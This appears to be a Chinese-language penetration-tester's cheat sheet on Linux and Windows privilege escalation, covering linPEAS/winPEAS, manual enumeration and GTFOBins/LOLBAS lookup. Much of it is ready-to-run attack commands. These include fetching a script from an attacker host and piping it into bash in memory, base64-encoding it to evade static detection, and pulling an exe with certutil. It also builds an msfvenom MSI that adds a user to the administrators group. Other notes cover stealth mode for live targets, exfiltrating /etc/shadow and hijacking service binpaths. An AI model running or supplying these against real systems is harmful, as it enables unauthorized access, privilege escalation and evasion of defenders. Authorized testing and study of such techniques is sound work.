## linpeas.sh — Linux 本地提权自动化枚举(PEASS)

来源:本机脚本 /home/kali/tools/src/PEASS-ng/linPEAS/linpeas.sh(git 仓库在 ~/tools/src/PEASS-ng)

```bash
# linpeas.sh 不存在时,用仓库自带 builder 重新生成(本仓库是源码,不带成品脚本)
cd /home/kali/tools/src/PEASS-ng/linPEAS                    # 注意在 linPEAS 目录内执行
export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334   # builder 要联网下外部工具
python3 -m builder.linpeas_builder --all-no-fat --output linpeas.sh    # 生成标准版 linpeas.sh
```

```bash
# ===== 传输方式 1:HTTP 服务(目标机有 curl/wget)=====
cd /home/kali/tools/src/PEASS-ng/linPEAS && python3 -m http.server 8080     # Kali 起临时 HTTP 服务
curl http://<Kali IP>:8080/linpeas.sh | bash                                # 目标机(Linux)内存执行不落盘
wget -qO- http://<Kali IP>:8080/linpeas.sh | bash                           # 目标机无 curl 时
```

```bash
# ===== 传输方式 2:scp 直传 + 回收输出 =====
scp /home/kali/tools/src/PEASS-ng/linPEAS/linpeas.sh <用户名>@<目标IP>:/tmp/lp.sh   # 复制到目标机
ssh <用户名>@<目标IP> "bash /tmp/lp.sh -a" | tee linpeas.out                        # 远程执行,输出落回本机
```

```bash
# ===== 目标机本机执行与免杀传输 =====
bash linpeas.sh -a > /dev/shm/linpeas.txt     # 全量检查,输出写内存盘(默认约 4 分钟,-a 更久)
less -R /dev/shm/linpeas.txt                  # 按原色查看:红色/加粗 = 高价值发现
base64 -w0 /home/kali/tools/src/PEASS-ng/linPEAS/linpeas.sh > /tmp/lp.enc      # Kali:base64 变形过静态检测
curl http://<Kali IP>:8080/lp.enc | base64 -d | bash          # 目标机:解码并内存执行
```

参数速查:
- `-a`:全量检查(含每用户 su 爆破 top2000、1 分钟进程监控,很吵)
- `-s`:超快 + 隐身模式(不写任何文件到磁盘)
- `-e`:额外枚举(默认跳过的检查)
- `-r`:正则扫描全盘 API 密钥(耗时数分钟到数小时)
- `-P <密码>`:提供密码用于 `sudo -l` 与其他用户 su 爆破
- `-o <分类逗号列表>`:只跑指定分类(system_information、users_information、software_information、interesting_files、api_keys_regex 等)
- `-d <IP/网段>` / `-i <IP>` / `-p <端口>`:发现存活主机/端口扫描(用了就不做提权检查)
- `-f <目录>`:离线分析固件/目录
- `-w` / `-q` / `-N`:检查块间暂停 / 不显示 banner / 不着色

注意:纯 bash 无依赖,/bin/sh 即可跑;默认不写盘、不 su 登录他人(除 `-a`);CTF 用 `-a`,实战隐蔽用 `-s`;线上目标优先 curl 管道执行不落盘。

## winPEAS — Windows 本地提权自动化枚举(PEASS)

来源:本机仓库 /home/kali/tools/src/PEASS-ng/winPEAS/(winPEASbat/winPEAS.bat、winPEASps1/winPEAS.ps1 直接可用;exe 需从 GitHub Releases 下载)

```bash
export https_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334      # 下载走代理
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O /tmp/winPEASx64.exe   # 下载 x64 预编译版
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -O /tmp/winPEASx86.exe   # 32 位系统用这个
# 仓库内自带免编译脚本:winPEASbat/winPEAS.bat(无 .NET 依赖)与 winPEASps1/winPEAS.ps1
```

```bash
# ===== 传输到 Windows 目标 =====
cd /tmp && python3 -m http.server 8080                        # Kali 起临时 HTTP 服务(存放 winPEASx64.exe)
cp /home/kali/tools/src/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat /tmp/   # 把仓库自带 bat 版也放进 /tmp 备用
impacket-smbserver share /tmp -smb2support                    # 或:Kali 起匿名 SMB 共享 /tmp(Ctrl+C 结束)
```

```bat
:: ===== 以下在 Windows 目标 cmd 执行(:: 开头整行为注释,可整段粘贴)=====
:: HTTP 方式拉取 exe
certutil -urlcache -f http://<Kali IP>:8080/winPEASx64.exe C:\Temp\winPEASx64.exe
:: SMB 方式直接拷 bat 版
copy \\<Kali IP>\share\winPEAS.bat C:\Temp\winPEAS.bat
:: 全量检查(默认,吵;CTF 用)
C:\Temp\winPEASx64.exe
:: 只看带利用命令的结果、无彩色输出
C:\Temp\winPEASx64.exe cmd quiet
:: 无 .NET 环境用 bat 版(无颜色,自行记重点)
winPEAS.bat
```

参数速查(exe 版,参数直接跟在命令后):
- (无参数):全部检查
- `cmd`:只显示带可执行命令的结果
- `quiet` / `notcolor`:静音 / 不着色
- `domain`:附加域信息枚举
- `wait`:每大项检查后暂停等待按键
- `debug`:输出调试信息
- `log`:结果写入 out.txt
- `<分类名> <分类名>`:只跑指定分类(如 `systeminfo userinfo`)
- `-lolbas`:附加 LOLBAS 搜索检查
- `-linpeas=<url>`:经 WSL 顺带跑 linpeas(自定义脚本地址)

注意:exe 版需 .NET 4+,bat 版兼容老旧系统;winPEAS 极吵(CPU/磁盘全开),有 EDR 的环境优先 ps1 版远程加载;`systeminfo` 段输出可喂给 windows-exploit-suggester 对照内核漏洞。

## Linux 提权手工流程 — 身份/SUID/cron/内核四步排查

来源:系统内置命令组合(id/sudo/find/crontab 等,目标机执行)

```bash
# ===== 第 1 步:身份与系统信息 =====
id && whoami                                    # 当前用户与所属组(docker/lxd/adm 组本身就是提权路径)
uname -a && cat /etc/os-release                 # 内核版本与发行版(对照第 4 步)
sudo -l                                         # 当前用户可 sudo 执行的命令(结果拿去 GTFOBins 查)
sudo -V | head -1                               # sudo 版本(有已知 CVE,如 Baron Samedit)
```

```bash
# ===== 第 2 步:SUID 与文件能力 =====
find / -perm -4000 -type f 2>/dev/null          # 全盘 SUID 二进制(逐个查 GTFOBins)
find / -perm -2000 -type f 2>/dev/null | head   # SGID 二进制(同理)
getcap -r / 2>/dev/null                         # 文件能力(cap_setuid/cap_dac_read_search 可直接提权)
```

```bash
# ===== 第 3 步:定时任务、服务与可写路径 =====
cat /etc/crontab                                # 系统级 cron(重点看 root 跑的脚本路径)
ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null   # 各周期目录与用户 crontab
find / -writable -type d 2>/dev/null | grep -vE "^/proc|^/sys|^/tmp" | head   # 可写目录(脚本替换/PATH 劫持)
ls -la /etc/passwd /etc/shadow                  # passwd 可写=直接加 uid 0 用户;shadow 可读=拖回爆破
```

```bash
# ===== 第 4 步:内核版本对照利用 =====
uname -r                                        # 记下内核版本,如 5.4.0-1042
searchsploit linux kernel <内核版本> privilege escalation      # 离线搜内核提权(如 5.4 ubuntu)
searchsploit -m <EDB-ID>                        # 相中的 exploit 镜像复制到当前目录研究
# 发行版对照:Debian/Ubuntu 还可查官方 security tracker(https://security-tracker.debian.org / ubuntu.com/security/CVEs)
```

参数速查(检查点):
- `sudo -l` 结果中的每个二进制 → GTFOBins 的 Sudo 小节
- SUID 列表 → GTFOBins 的 Suid 小节
- root 的 cron 脚本所在目录可写 → 覆盖脚本等下次触发
- `/etc/passwd` 可写或 PATH 含可写目录 → 直接加用户/劫持
- 内核版本 + `searchsploit` → 内核漏洞(dirtycow/dirtypipe/pwnkit 一类)
- docker/lxd 组 → 挂载宿主文件系统
- 能力 cap_setuid+ep → 调 python/perl 一句提权(GTFOBins:capabilities)

注意:先枚举后利用,优先无损路径(可写脚本/PATH),内核 exploit 放最后(易宕机,快照先行);`sudo -l` 需要输入当前用户密码(或免密);`-a` 版 linpeas 的 su 爆破会写 auth.log,痕迹多。

## Windows 提权手工流程 — 服务路径/未加引号/AlwaysInstallElevated

来源:系统内置命令(cmd/reg/wmic/sc,目标机执行)

```bat
:: ===== 第 1 步:服务二进制路径检查(可写/未加引号)=====
:: 列出非系统目录的自启服务(关注 pathname 落在 C:\ 下非 Windows 目录的)
wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
:: 查看单个服务:BINARY_PATH_NAME、运行账户(SYSTEM 才有价值)
sc qc <服务名>
:: 检查服务二进制是否当前用户可写(M/W 权限即可替换)
icacls "C:\Program Files\服务目录\服务.exe"
```

```bat
:: ===== 第 2 步:未加引号服务路径(Unquoted Path)=====
:: 确认 C:\Program Files 本身是否可写(通常不可,但 C:\ 下可写就够)
dir "C:\Program Files" /a
:: 复查路径确认空格与引号
sc qc <服务名> | findstr BINARY_PATH_NAME
```

```bat
:: ===== 第 3 步:AlwaysInstallElevated(MSI 以 SYSTEM 安装)=====
:: 查机器策略
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 查用户策略
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: 两处都返回 0x1 才可利用;策略默认不存在
```

```bat
:: ===== 第 4 步:令牌与补丁速查 =====
:: 关注 SeImpersonatePrivilege(JuicyPotato/RoguePotato 一族,见 05-AD)
whoami /priv
:: 是否在高完整性/服务组
whoami /groups
:: 已装补丁列表(对照已知 CVE,结合 systeminfo)
wmic qfe list brief
```

```bash
# ===== AlwaysInstallElevated 利用(Kali 侧)=====
msfvenom -p windows/x64/exec CMD='net localgroup administrators <低权用户名> /add' -f msi-nouac -o /tmp/up.msi
# 生成加组用的 MSI(详见 03-漏洞利用与C2.md 的 msfvenom 小节)
scp/impacket 上传 up.msi 后,目标机执行:msiexec /quiet /qn /i C:\Temp\up.msi
```

参数速查(检查点):
- 自启服务二进制在 C:\ 下非系统目录 → `icacls` 验证可写 → 替换后 `sc stop/start` 或等重启
- 服务路径含空格未加引号 → 逐级空格目录尝试放置截断 exe(需目录可写)
- `AlwaysInstallElevated` 双 0x1 → msfvenom msi-nouac 直接 SYSTEM
- `SeImpersonatePrivilege` → Potato 系列提权(Windows 10/11 用 RougePotato/SweetPotato)
- 服务配置权限(可改 BINPATH)→ `sc config <服务名> binpath= "cmd /c ..."`(改完重启服务)
- 未打补丁对照 `wmic qfe` → 内核漏洞(可用 windows-exploit-suggester 对照 systeminfo)

注意:新系统 wmic 逐步弃用,可换 PowerShell:`Get-CimInstance Win32_Service | Select Name,PathName,StartMode`;改服务/写系统目录会被 EDR 盯上,先确认权限再动手;AlwaysInstallElevated 两处注册表都为 1 才成立,只查一处会误判。

## GTFOBins / LOLBAS 查询 — 可滥用二进制的用法检索(只查不猜)

来源:在线库 https://gtfobins.github.io(Linux)与 https://lolbas-project.github.io(Windows);可克隆 GTFOBins 仓库离线查

```bash
export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334     # 需联网,先设代理
git clone https://github.com/GTFOBins/GTFOBins.github.io ~/tools/src/GTFOBins     # 克隆离线镜像(每个二进制一个 md)
ls ~/tools/src/GTFOBins/_gtfobins/ | grep -i <二进制名>                          # 确认某二进制是否在库(如 awk、find、vim)
grep -i "^## " ~/tools/src/GTFOBins/_gtfobins/find.md                            # 列出 find 支持的滥用场景小节
```

```bash
# ===== 查询方法(不背命令,现场查)=====
# 1) sudo -l 发现 sudo find,或 SUID 列表里有 find → 打开 gtfobins.github.io/gtfobins/find
# 2) 按场景复制对应小节命令:Shell(直接弹 shell)/ Sudo(sudo 下用法)/ Suid(SUID 下用法)/
#    Limited Suid(受限 SUID)/ File Read / File Write / File Download / Reverse Shell
# 3) Windows 侧同理:certutil/rundll32/msbuild/msiexec 等 → lolbas-project.github.io 按二进制名或功能检索
```

参数速查(查询点):
- GTFOBins:Linux 二进制滥用库,入口按二进制名搜索,用法按 Sudo/Suid/Shell 等小节分类
- `Limited Suid` 小节:SUID 下只有部分能力(如仅文件读),别误当全功能
- LOLBAS:Windows " living-off-the-land" 二进制(certutil 下载、msbuild 执行、rundll32 执行等)
- LOLBAS 检索维度:二进制名、功能标签(Download/Execute/Compile/AVBypass)
- 离线:`ls ~/tools/src/GTFOBins/_gtfobins/` 全量列表 + 打开对应 md
- 库里没有的二进制 = 无通用滥用路径,别硬凑命令
- 组合思路:sudo -l/SUID 枚举结果(见上文手工流程)→ GTFOBins 查询 → 复制对应小节命令执行

注意:GTFOBins 页面命令分场景,Sudo 小节的命令在 SUID 场景不一定成立(反之亦然);内网无出口时用离线克隆版;别在报告里抄库里的命令当"自己验证过"的结论。
